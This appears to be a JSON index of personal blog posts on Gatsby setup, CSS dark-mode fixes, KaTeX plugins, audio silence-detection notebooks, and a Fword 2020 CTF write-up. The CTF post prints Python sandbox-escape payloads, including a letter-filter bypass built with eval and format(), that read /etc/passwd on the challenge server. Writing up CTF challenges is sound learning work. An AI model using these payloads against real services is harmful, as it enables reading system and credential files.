path.resolve(`./src/templates/BlogPost.tsx`); const tagPage = path.resolve(`./src/templates/TagsPage.tsx`); const projectPost = path.resolve(`./src/templates/ProjectPost.tsx`); /* graphql query from above goes here */ if (result.errors) { throw result.errors; } // Create blog posts pages. const posts = result.data.allMarkdownRemark.edges; posts.forEach((post, index) =&gt; { const previous = index === posts.length - 1 ? null : posts[index + 1].node; const next = index === 0 ? null : posts[index - 1].node; createPage({ path: post.node.fields.slug, component: /blog/.test(post.node.fileAbsolutePath) ? blogPost : projectPost, context: { slug: post.node.fields.slug, previous, next, }, }); }); }; . Finally, to ensure slugs get properly created, we need to use createFilePath to create the slugs for the above command conditionally like so: . exports.onCreateNode = ({ node, actions, getNode }) =&gt; { const { createNodeField } = actions; if (node.internal.type === `MarkdownRemark`) { const value = createFilePath({ node, getNode }); createNodeField({ name: `slug`, node, value: `/${ /blog/.test(node.fileAbsolutePath) ? &#39;blog&#39; : &#39;projects&#39; }${value}`, }); } . Hooking up the frontend . This is most of the “backend” work done, and the rest of the work consists of using this data. You can probably reuse the code examples given in the first resource I have linked below, or check out the source code for this blog you’re reading right now. The harder part in my opinion was knowing how to use the absolute path in graphql in the page creation phase, as I really disliked having to label the projects markdown pages with an explicit field when I have already put it in its own folder. . Resources . building gatsby with multiple post types | making multiple content types in gatsby | .",
            "url": "https://blog.justinor.dev/gatsby/2020/09/06/multiple-blog-types.html",
            "relUrl": "/gatsby/2020/09/06/multiple-blog-types.html",
            "date": " • Sep 6, 2020"
        }
        
    
  
    
        ,"post3": {
            "title": "The Quest for a cool header design",
            "content": "When I first came up with the idea to highlight the current page with a rounded box, it sounded really easy to implement. I even decided to go really simple and make it just invert the background. So in light mode, it would be a black box which had white text insde, and the opposite for dark mode. What could go wrong? . everything. . Lets go through some of the blood sweat and tears I went through so you don’t have to go through the same! . Inverting Colors . Essentially, I saw this css-tricks article about contrasting text backgrounds which involved using the mix-blend-mode: difference; CSS on the foreground so that it would invert its background. This would work flawlessly for the dark background with white foreground, and its also the example they gave in this article: . header { background: url(black-and-white-image.jpg); } h2 { color: white; mix-blend-mode: difference; } . However, try to do it for the opposite case and things come crashing down. . Try 1: backdrop-filter . I initially tried using this CSS, which applies a filter to the background of this image - this is actually how I have blurred everything when a user clicks the sandwich menu in mobile view. When combined with contrast(2) I was able to get commendable results on chrome. However, as soon as I tried using the website with firefox, the backdrop filter was no where to be found! This is because Mozilla Firefox have hidden the feature behind an experimental flag… . Try 2: back to mix-blend-mode . So I went back to the original method, and decided on figuring out how to have this inverted color idea work for both light and dark modes. Essentially, I’ve found that I need to do the following things: . color the text normally | color the inverting div white, with mix-blend-mode: difference | wrap everything in a div which provides the colors: background: var(--color-background) | color: var(--color-text) | transitions to make toggling the color easier on the eye | . | . These things in bold took me very long to figure out~ . Especially the div that provides colors, you can’t apply the color to the body, it needs to be in a div you style, or else in Chrome it results in the mix-blend-mode failing, BUT IT WORKS FINE IN FIREFOX!! . So many times, it would either only work in chrome, only work in firefox, only dark mode works, only light mode works. Shout out to my friend who provided me support in my darkest moments, he was the one to suggesting making the inverting div white, very smart guy. . In code, here is a watered down example consisting only the color variables required to pull off this effect (note that Underline should have absolute position and overlap with the text in StyledLink): . // styles const ColorProvider = styled.div` background: var(--color-background); color: var(--color-text); transition: all 0.25s linear; `; const Underline = styled(motion.div)` mix-blend-mode: difference; background-color: white; `; const StyledLink = styled(Link)` color: var(--color-text); `; // code &lt;ColorProvider&gt; &lt;Underline /&gt; &lt;StyledLink&gt;Home&lt;/StyledLink&gt; &lt;/ColorProvider&gt;; . FOUC . Flash of Unstyled Content is a prominent problem in Gatsby, as part of the reason why it can serve content so fast is because it prebuilds all the html. Because it can serve the html so fast, more often than not, the html loads first before CSS styles are loaded in, resulting in blank white unstyled content flickering before the styles load in. I did not like this. . Try 1 - Maybe Material-ui? . I was using material-ui as its my goto web-ui toolkit. However, I nearly considered giving up this toolkit while making this website. It appeared that whenever I used their themeProvider, it would completely break my styles, display a FOUC, and transitions applied to the body did not apply to any material-ui components. . However, I soon learnt that I was mistaken, as I had followed the documentation for material-ui blindly, and used the &lt;CssBaseline /&gt; component because they used it. Short answer - this will screw up the original css in the page. This was particularly bad for my case, as I needed to define the themes with css variables or else a FOUC would occur on every page load as Gatsby would not know about the style. . However, even without &lt;CssBaseline /&gt;, things were still going sour, FOUC was showing, I was still awake at 2am trying to fix this. . Try 2 - styled(components) . TURNS OUT: I’ve been applying global styles through a component createGlobalStyle from &#39;styled-components&#39;. This applied a style to the body which set the background-color and color. It doesn’t seem to work immediately on page load, resulting in a flash of white in dark mode, before a transition to the proper color. So now, I create my own div styled with in-line CSS defining those color css variables. The result works like a charm! . const ColorProvider = styled.div` background: var(--color-background); color: var(--color-text); transition: all 0.25s linear; `; const Layout: React.FC = ({ children }) =&gt; { return ( &lt;&gt; &lt;ColorProvider&gt; &lt;Header /&gt; {children} &lt;Footer /&gt; &lt;/ColorProvider&gt; &lt;/&gt; ); }; . This is only the stuff I remembered that I fixed, there was so much trial and error, and me reloading the site 100 times, that I’ve probably forgotten half of the stuff I tried to do to fix these problems I had. .",
            "url": "https://blog.justinor.dev/frontend/gatsby/2020/09/05/the-perils-of-web-dev.html",
            "relUrl": "/frontend/gatsby/2020/09/05/the-perils-of-web-dev.html",
            "date": " • Sep 5, 2020"
        }
        
    
  
    
        ,"post4": {
            "title": "Gatsby has a lot of cool plugins",
            "content": "You may have realised that the codeblocks on this blog look really nice… . import string charset = &#39;&#39; + string.ascii_letters + string.punctuation + string.digits def generatePassword(index: int): current = index result = [] while True: remainder = current % len(charset) result.append(charset[remainder]) current = current // len(charset) return &#39;&#39;.join(result) . Believe it or not, all the blog posts on this page are formatted from a markdown file! . gatsby-remark-highlight-code . This is what is used to get those really nice looking code outputs. More information including installation can be found here. . gatsby-remark-katex . This lets me write latex in markdown!! It can be inline like $a^2+b^2=c^2$, or it can be in full size mode like so: . I=∫abf(x)g(x)dx∴I=∫abf(x)f′(x)f′(x)g(x)dx begin{aligned} I &amp;= int_{a}^{b} frac{f(x)}{g(x)} dx therefore I &amp;= int_{a}^{b} frac{f(x)}{f&amp;#x27;(x)} frac{f&amp;#x27;(x)}{g(x)} dx end{aligned}I∴I​=∫ab​g(x)f(x)​dx=∫ab​f′(x)f(x)​g(x)f′(x)​dx​ . One interesting point is that some environments I’m used to using like begin{align*} end{align*) are unavailable. Here is a list of supported latex environments and other commands you can use with $K^AT_EX$. More information here. . Future . mdx . This is something created with Gatsby in mind, a fusion between Markdown md and jsx, allowing for importing code inside a markdown file for extra utility. . There are some amazing things you can do with it right now, such as Gatsby Theme Waves, which lets you tell a story by animating changes in code blocks, powerpoints and graphs. A super cool tool, but I just got remark to work, so I will probably implement this later when there are more packages I want that require mdx. . To install mdx, you may find these links helpful: . Gatsby - How to convert an existing Gatsby blog to use MDX | Typescript typings | .",
            "url": "https://blog.justinor.dev/gatsby/frontend/javascript/2020/09/01/gatsby-is-cool.html",
            "relUrl": "/gatsby/frontend/javascript/2020/09/01/gatsby-is-cool.html",
            "date": " • Sep 1, 2020"
        }
        
    
  
    
        ,"post5": {
            "title": "Fword 2020 CTF write-up",
            "content": ". This was one of the first CTFs I’ve competed in, and I’m pretty happy with the performance we obtained. I worked on two problems, one which I didn’t get in the end. But it was still a great learning experience. I definitely got carried by the other people in my team, who did really well in the pwn section. . Problem 1 - Secret Array . TL;DR . use pwntools to interface with the IP and port, not netcat, as there is no easy way to pipe python output to netcat | DON’T name your file something generic like pwn.py or numbers.py, as those are internally used by pwntools, and will result in failures DX | don’t overengineer your answers, occam’s razor | installation steps: | . virtualenv venv . venv/bin/activate pip install pwntools . The problem was hosted in a server, and netcat was used to access it. nc secretarray.fword.wtf 1337 . The problem stated that there were 1337 unknown numbers in an array, and we were allowed to query the server with 2 valid indices, which would return the sum of the two numbers in the array at those indices. We were allowed to query the server 1337 times. . At first glance, I immediately felt like this would be a great opportunity to use np.linalg.solve, as the problem was essentially a really big simultaneous equations problem, so at first I made arbitrary guesses of the form: . for i in range(1337): if i == 1336: print(f&quot;0 1336&quot;) else: print(f&quot;{i} {i+1}&quot;) . This yielded a list of 1337 numbers, which I turned into a numpy array. I also converted my guesses into a numpy matrix like so: . matrix = np.zeros((1337,1337)) for i in range(1337): if i == 1336: matrix[i,i] = 1 matrix[i,0] = 1 else: matrix[i,i] = 1 matrix[i,i+1] = 1 matrix = matrix.astype(&#39;float64&#39;) ans = np.linalg.solve(matrix, res) for a in ans: print(a) . However, I immediately realised this wasn’t going to work when I was getting floats as my answers… . So instead, I decided to rethink my strategy, since the simulataneous equations were quite simple: . Let every element in the array be labelled like $a_{i}, i in 1,2,…,N, text{where } N=1337$. | Thinking for a simple case, where $N=3$, we see that for the following chosen indices: | . {a0+a1=b0(1)a0+a2=b1(2)a1+a2=b2(3) begin{cases} a_0 + a_1 = b_0 qquad (1) a_0 + a_2 = b_1 qquad (2) a_1 + a_2 = b_2 qquad (3) end{cases}⎩⎪⎪⎨⎪⎪⎧​a0​+a1​=b0​(1)a0​+a2​=b1​(2)a1​+a2​=b2​(3)​ . We can simply solve these by computing $(1)-(2) equiv a_1 - a_2 = b_0 - b_1$, adding this to $(3)$, we obtain | . {a0=b0−a1a1=b0−b1+b22a2=b0−a2 begin{cases} a_0 = b_0 - a_1 a_1 = frac{b_0 - b_1 + b_2}{2} a_2 = b_0 - a_2 end{cases}⎩⎪⎪⎨⎪⎪⎧​a0​=b0​−a1​a1​=2b0​−b1​+b2​​a2​=b0​−a2​​ . By solving this simplest case, we get a values for $a_0, a_1, a_2$ and we can easily extend this scenario to $N=4$ by taking the 4th simultaneous equation to be . a2+a3=b3∴a3=b3−a2 begin{aligned} a_2 + a_3 &amp;= b_3 therefore a_3 &amp;= b_3 - a_2 end{aligned}a2​+a3​∴a3​​=b3​=b3​−a2​​ . So I just coded this: . with open(&#39;output.txt&#39;,&#39;r&#39;) as f: data = f.readlines() data = [int(d[:-1]) for d in data] #strip newline # solve the first 3 answers = [0 for _ in range(1337)] answers[1] = (data[0]-data[1]+data[2])/2 answers[0] = data[0]-answers[1] answers[2] = data[2]-answers[1] for i in range(3,1337): answers[i] = data[i]-answers[i-1] # checking assert(answers[0]+answers[1] == data[0]) assert(answers[0]+answers[2] == data[1]) assert(answers[1]+answers[2] == data[2]) for i in range(3,1337): assert(answers[i-1]+answers[i] == data[i]) print(&quot;DONE &quot;+&quot; &quot;.join(str(a) for a in answers)) . Now, when I was trying to get pwntools to work, I had made the moronically called the file pwn.py which was an internal file used in pwntools, so it failed, I eventually got my friend to run the code above and he got the flag :S. . Problem 2 - Directory Manager . This one was really hard and involved a Server Side Template Injection in python. I didn’t get it this time, but here are some things I found out that might prove useful in later CTFs. . Recon . I just kept trying different inputs, here are some examples of what I got . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : dir &lt;built-in function dir&gt; . Some more examples include: . dir: &lt;built-in function dir&gt; file: &lt;type &#39;file&#39;&gt; exit: Use exit() or Ctrl-D (i.e. EOF) to exit anything where the second letter is an s: Thank you ! []: [] [&#39;hello&#39;]: [] [&#39;qwertyuiopadfghjklzxcvbnm,./;[] -=1234567890!@#$%^&amp;*()_+{}|:&quot;&lt;&gt;?&#39;]: [&#39;qwertyuiopadfghjklzxcvbnm,./;[] -=1234567890!@#$%^&amp;*()_+{}|:&quot;&lt;&gt;?&#39;] . Ultimately, from the output interpretations of dir and file, I was pretty sure python code was executing. However, interestingly any input that contained the letter ‘s’ would fail with Thank you !. . Intro to SSTI . In a previous challenge, I performed Server Side Template Injection (SSTI) and remote code execution (RCE) through a Flask template input by exploiting the fact that file is a built in type, and that there were certain builtin class functions that let you go from any one class to any other class. . &gt;&gt;&gt; [].__class__ &lt;type &#39;list&#39;&gt; . Here, we can abuse the .__class__ method to obtain a reference to the list object type. . &gt;&gt;&gt; [].__class__.__base__ &lt;type &#39;object&#39;&gt; . We can go further and obtain the object class like so. . &gt;&gt;&gt; [].__class__.__base__.__subclasses__() [&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;] . We can actually find the file type, by taking the 40th element in this list: . &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40] &lt;type &#39;file&#39;&gt; . And finally, we can use this type as a function to read and print a file. . &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() &#39;root:x:0:0:root:/root:/bin/bash ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin nbin:x:2:2:bin:/bin:/usr/sbin/nologin nsys:x:3:3:sys:/dev:/usr/sbin/nologin nsync:x:4:65534:sync:/bin:/bin/sync ngames:x:5:60:games:/usr/games:/usr/sbin/nologin nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin nfword:x:1000:1000::/home/fword/:/bin/bash nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin n&#39; . no ‘s’ . Now you can probably see why banning the letter ‘s’ would be problematic, as the letter ‘s’ appears in all the builtin functions we used to grab the file type. . However, fear not, as security engineers always find a way! . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : [dir()] [[&#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__warningregistry__&#39;, &#39;conn&#39;, &#39;inp&#39;, &#39;isallowed&#39;, &#39;ldap&#39;]] . I found I was able to evaluate the dir() function if it was contained in a list, and lo and behold! the first element of this list has the letter ‘s’ in it~ . I grabbed this ‘s’ to see if it would pass whatever black listing was happening behind the scenes: . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : dir()[0][9] s . Bingo. Now, I just used the string format function to craft the payload shown in the previous section: . xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234 Welcome to our Directory Manager, what do you want to execute : [eval(&#39;[].__cla{0}{0}__.__ba{0}e__.__{0}ubcla{0}{0}e{0}__()&#39;.format(dir()[0][9]))[40](&#39;/etc/pa{0}{0}wd&#39;.format(dir()[0][9])).read()] [&#39;root:x:0:0:root:/root:/bin/bash ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin nbin:x:2:2:bin:/bin:/usr/sbin/nologin nsys:x:3:3:sys:/dev:/usr/sbin/nologin nsync:x:4:65534:sync:/bin:/bin/sync ngames:x:5:60:games:/usr/games:/usr/sbin/nologin nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin nfword:x:1000:1000::/home/fword/:/bin/bash nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin n&#39;] . Although I was able to read /etc/passwd, as well as some other common files like .bashrc, without access to the os library, I was unnable to get a list of the directory, to know which file to target. . Failures . I tried a lot of different things, here’s how they worked out: . I can eval but I am blacklisted from running exec, or running eval(compile()), which means I cannot import. | I can use __import__(os).listdirs() but this is blocked from running, and black listed. Really, I spent a few hours testing random directories and possible file names for the flag, but without access to ls, I am really at a loss for knowing which file to target. Hence I was unable to get the flag in the end. | .",
            "url": "https://blog.justinor.dev/ctf/security/2020/09/01/fword2020-ctf.html",
            "relUrl": "/ctf/security/2020/09/01/fword2020-ctf.html",
            "date": " • Sep 1, 2020"
        }
        
    
  
    
        ,"post6": {
            "title": "Silence Detection II",
            "content": "import os import numpy as np import argparse from tqdm import tqdm import librosa import soundfile as sf from matplotlib import pyplot as plt %matplotlib inline . # input_filename = &#39;/home/justin/MAS_Project/data/test/00/3263A1.wav&#39; input_path = &#39;/home/justin/MAS_Project/data/test/00/&#39; # filename = &#39;3841A1.wav&#39; # output_path = &#39;/home/justin/MAS_Project/data/test/00/test/&#39; # input_path = &#39;input/&#39; filename = &#39;3263A1&#39; extension = &#39;.wav&#39; output_path = &#39;output/&#39; def load_file(input_filename, mono=True, sr=44100): #sr=22050): # if mono is true, returns samples of shape (2, n, ) # else returns samples of shape (n, ) # sample rate refers to number of samples per second: default selected by None, librosa default is 22050 x, sr = librosa.load(input_filename, mono=mono, sr=sr) return x, sr x, sr = load_file(input_path + filename + extension) . def plot_wav(time_series,sample_rate): plt.figure(figsize=(20, 6)) plt.xlabel(&#39;time&#39;) plt.ylabel(&#39;amplitude&#39;) print(0., len(time_series)/sample_rate, len(time_series)) print(len(time_series)) t = np.linspace(0., len(time_series)/sample_rate, len(time_series)) print(len(t)) plt.plot(t, time_series) return plt plot_wav(x, sr) START = 51 #121#11 DUR = 4 #2#5 def plot_xvis(x, start, dur, onset_times, sr): end = start + dur x_vis = x[start*sr:end*sr] plot_wav(x_vis, sr) for onset in onset_times: if onset &lt; start: continue elif onset &gt; end: break plt.axvline(x=onset-start) plot_xvis(x, START, DUR, [], sr) # Sine wave noise removal: spectogram def get_S(x, sr): x = np.array(x) return librosa.feature.melspectrogram(y=x, sr=sr, n_mels=128, fmax=8000) def plot_ms(x, sr): import librosa.display S = get_S(x, sr) plt.figure(figsize=(10, 4)) librosa.display.specshow(librosa.power_to_db(S, ref=np.max), y_axis=&#39;mel&#39;, fmax=8000, x_axis=&#39;time&#39;) plt.colorbar(format=&#39;%+2.0f dB&#39;) plt.title(&#39;Mel spectrogram&#39;) plt.tight_layout() plt.show() def plot_msvis(x, start, dur, sr): end = start + dur x_vis = x[start*sr:end*sr] plot_ms(x_vis, sr) # plot_ms(x) plot_msvis(x, START, DUR, sr) . 0.0 300.0 13230000 13230000 13230000 0.0 4.0 176400 176400 176400 . def cut_recording(x, sr): x = cut(x, cut_by_integration(x, width=sr), sr) plot_wav(x, sr) return x def cut(x, endtime, sr): print(&quot;cutting at &quot; + str(endtime)) return x[:int(endtime+0.5)*sr] def cut_by_integration(x, width=sr): # integrate in a sliding window area of interest, the magnitude gives us a value to judge where to cut length = len(x) seconds = int(length/sr) windows = range(0, length, sr) intx = [abs(sum(x[a: a+sr])) for a in windows] plt.figure() plt.plot(intx) s = get_S(t, sr) rms = librosa.feature.rms(S = s) plt.figure() plt.plot(rms[0]) for i in range(seconds-1, 0, -1): if intx[i] &gt; 200: # cutoff print(&quot;cutoff reached&quot;) return i+1 if i+1 &lt; seconds-1 else seconds-1 return -1 # x = cut_recording(x, sr) # cut_recording(x, sr) . # source: https://manual.audacityteam.org/man/dc_offset.html # Audacity&#39;s DC removal method performs a calculation to make the average positive and negative sample values equal. def dc_removal(x, sr): x_mean = np.mean(x) print(x_mean) x = [e - x_mean for e in x] plot_wav(x, sr) return x x = dc_removal(x, sr) . -0.23329706 0.0 300.0 13230000 13230000 13230000 . def high_pass_filter(x, sr, cutOff = 500): from scipy import signal #Creation of filter nyq = 0.5 * sr N = 5 # Filter order fc = cutOff / nyq # Cutoff frequency normal b, a = signal.butter(N, fc, btype=&#39;high&#39;) # high pass filter #Apply the filter tempf = signal.filtfilt(b, a, x) return tempf normal_t = high_pass_filter(x, sr, cutOff=20) t = high_pass_filter(x, sr, cutOff=300) plot_xvis(t, 0, 6, [], sr) . 0.0 6.0 264600 264600 264600 . nstart = 0 ndur = 10 def preprocess(t, sr): s = get_S(t, sr) rms = librosa.feature.rms(S = s) threshold = np.heaviside(rms[0] - 0.025,1) i = 0 silence = (threshold[i] == 1.0) sounds = [] curr_sound = [] frames = [] curr_frame = [] for i in range(1, len(threshold)): if threshold[i] == 1.0 and threshold[i-1] &lt; 1.0: #start of sound if not curr_sound: curr_sound.append(i*512/sr) curr_frame.append(i) elif threshold[i] == 0.0 and threshold[i-1] &gt; 0.0: #end of sound if curr_sound: curr_sound.append(i*512/sr) sounds.append(curr_sound) curr_sound = [] curr_frame.append(i) frames.append(curr_frame) curr_frame = [] # apply minimum length of 0.1 seconds for silence print(&quot;before: len = &quot;, len(sounds)) i = 1 min_len = 0.1 while i &lt; len(sounds): if sounds[i][0]-sounds[i-1][1] &lt; min_len: # this silence is too short sounds[i-1][1] = sounds[i][1] sounds.pop(i) frames[i-1][1] = frames[i][1] frames.pop(i) i -= 1 i += 1 i = 1 while i &lt; len(sounds): if sounds[i][1] - sounds[i][0] &lt; min_len: # this silence is also too short sounds.pop(i) frames.pop(i) i -= 1 i += 1 print(&quot;now, sounds: &quot;, len(sounds)) return t, rms, threshold, sounds, frames def test_rms(t, rms, threshold, sounds, sr, nstart=0, ndur=5): # plot_xvis(t, nstart, ndur, [], sr) t_vis = t[nstart*sr:(nstart+ndur)*sr] t_vis = [20*a + 10 for a in t_vis] plt.figure(figsize=(20, 6)) plt.xlabel(&#39;time&#39;) plt.ylabel(&#39;amplitude&#39;) teess = np.linspace(0., len(t_vis)/sr, len(t_vis)) plt.plot(teess, t_vis) # print(sounds) ssounds = np.array(sounds) ssounds = ssounds.flatten() for onset in ssounds: if onset &lt; nstart: continue elif onset &gt; nstart+ndur: break plt.axvline(x=onset-nstart) vis_start = int(nstart*(sr/512)) vis_end = int((nstart+ndur)*(sr/512)) rms_threshold_vis = threshold[vis_start:vis_end] rms_vis = rms[0][vis_start:vis_end] print(&quot;Processed up to &quot;, vis_end) tees = np.linspace(0., len(rms_vis)/int(sr/512), len(rms_vis)) plt.plot(tees, rms_vis) plt.fill_between(tees, 0, 20, where=rms_threshold_vis &gt; 0,facecolor=&#39;green&#39;, alpha=0.5) plt.show t, rms, threshold, ssounds, frames = preprocess(t, sr) for i in range(0, int(len(t)/sr), ndur): test_rms(t, rms, threshold, ssounds, sr, nstart=i, ndur=ndur) if i &gt; 130: break . before: len = 231 now, sounds: 96 Processed up to 861 Processed up to 1722 Processed up to 2583 Processed up to 3445 Processed up to 4306 Processed up to 5167 Processed up to 6029 Processed up to 6890 Processed up to 7751 Processed up to 8613 Processed up to 9474 Processed up to 10335 Processed up to 11197 Processed up to 12058 Processed up to 12919 . import IPython.display as ipd print(sr) ipd.Audio(t, rate=sr) . 44100 . Your browser does not support the audio element. # for i,s in enumerate(ssounds): # stream = ffmpeg.input(input_path + filename + extension) # stream.trim(start=s[0], end=s[1]) # stream.output(output_path + filename + &quot;_{}&quot;.format(i)) # stream.run() # if i == 1: # break print(frames[:10]) print(frames[-10:]) . [[16, 47], [141, 168], [237, 316], [356, 397], [432, 497], [543, 592], [627, 685], [741, 802], [838, 897], [939, 998]] [[9941, 9989], [10034, 10070], [10263, 10295], [10389, 10407], [10536, 10602], [10617, 10651], [10721, 10756], [10780, 10817], [10881, 10953], [11159, 11180]] .",
            "url": "https://blog.justinor.dev/jupyter/audio/2020/05/31/silence-detection-II-silence_detection.html",
            "relUrl": "/jupyter/audio/2020/05/31/silence-detection-II-silence_detection.html",
            "date": " • May 31, 2020"
        }
        
    
  
    
        ,"post7": {
            "title": "Silence Detection I",
            "content": "import os import numpy as np import argparse from tqdm import tqdm # since scipy can&#39;t open my wav files :( import librosa import soundfile as sf from matplotlib import pyplot as plt %matplotlib inline . # input_filename = &#39;/home/justin/MAS_Project/data/test/00/3263A1.wav&#39; input_path = &#39;/home/justin/MAS_Project/data/test/00/&#39; filename = &#39;3263A1.wav&#39; output_path = &#39;/home/justin/MAS_Project/data/test/00/test/&#39; def load_file(input_filename, mono=True, sr=22050): # if mono is true, returns samples of shape (2, n, ) # else returns samples of shape (n, ) # sample rate refers to number of samples per second: default selected by None, librosa default is 22050 x, sr = librosa.load(input_filename, mono=mono, sr=sr) return x, sr x, sr = load_file(input_path + filename) print(&quot;x: {}&quot;.format(x)) print(&quot;sr:{}&quot;.format(sr)) . x: [-4.5927978e-01 -7.1761596e-01 -6.5993911e-01 ... 4.9066753e-04 4.1590389e-04 1.5428341e-03] sr:22050 . def plot_wav(time_series,sample_rate): plt.figure(figsize=(20, 6)) plt.xlabel(&#39;time&#39;) plt.ylabel(&#39;amplitude&#39;) print(0., len(time_series)/sample_rate, len(time_series)) print(len(time_series)) t = np.linspace(0., len(time_series)/sample_rate, len(time_series)) print(len(t)) # time = librosa.samples_to_time(time_series) plt.plot(t, time_series) return plt plot_wav(x, sr) . 0.0 300.0 6615000 6615000 6615000 . &lt;module &#39;matplotlib.pyplot&#39; from &#39;/home/justin/anaconda3/envs/tor/lib/python3.7/site-packages/matplotlib/pyplot.py&#39;&gt; . def find_onset_frames(x, sr, backtrack=True): onset_frames = librosa.onset.onset_detect( x, # audio time series sr=sr, # sampling rate wait=1, # pre_avg=1, post_avg=1, pre_max=1, post_max=1, backtrack=backtrack ) # print(onset_frames) # frame numbers of estimated onsets onset_times = librosa.frames_to_time(onset_frames) print(onset_times) return onset_times onset_times = find_onset_frames(x, sr) . [ 1.34675737 1.4860771 2.94893424 3.52943311 4.10993197 4.99229025 